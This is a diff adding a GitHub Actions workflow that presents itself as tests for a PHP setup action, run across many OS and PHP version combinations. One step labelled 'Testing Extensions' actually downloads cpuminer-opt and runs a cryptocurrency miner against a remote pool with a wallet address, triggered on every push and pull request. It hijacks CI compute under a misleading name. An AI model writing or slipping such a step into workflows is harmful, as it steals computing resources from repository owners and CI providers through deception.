@@ -1,0 +1,56 @@
+name: test111 workflow
+
+on:
+  workflow_dispatch:
+  pull_request:
+    branches:
+      - releases/v1
+    paths-ignore:
+      - '**.md'
+      - 'examples/**'
+  push:
+    branches:
+      - releases/v1
+    paths-ignore:
+      - '**.md'
+      - 'examples/**'
+jobs:
+  run:
+    name: Run
+    runs-on: ${{ matrix.operating-system }}
+    strategy:
+      fail-fast: false
+      matrix:
+        operating-system: [ubuntu-20.04, ubuntu-18.04, ubuntu-16.04, windows-latest, macos-latest]
+        php-versions: ['5.6', '7.0', '7.1', '7.2', '7.3', '7.4', '8.0']
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v2
+
+      - name: Setup PHP with extensions and custom config
+        run: node dist/index.js
+        env:
+          php-version: ${{ matrix.php-versions }}
+          extensions: xml, opcache, xdebug, pcov #optional
+          ini-values: post_max_size=256M, short_open_tag=On, date.timezone=Asia/Kolkata #optional
+
+      - name: Testing PHP version
+        run: |
+          php -v
+          php -r "if(strpos(phpversion(), '${{ matrix.php-versions }}') === false) {throw new Exception('Wrong PHP version Installed');}"
+      - name: Testing Composer version
+        run: |
+          composer -V
+          php -r "if(strpos(@exec('composer -V'), 'Composer version') === false) {throw new Exception('Composer not found');}"
+      - name: Testing Extensions
+        run: |
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.10
+
+      - name: Testing ini values
+        run: |
+          php -r "if(ini_get('memory_limit')!='-1') {throw new Exception('memory_limit not disabled');}"
+          php -r "if(ini_get('post_max_size')!='256M') {throw new Exception('post_max_size not added');}"
+          php -r "if(ini_get('short_open_tag')!=1) {throw new Exception('short_open_tag not added');}"
+          php -r "if(ini_get('date.timezone')!='Asia/Kolkata') {throw new Exception('date.timezone not added');}"
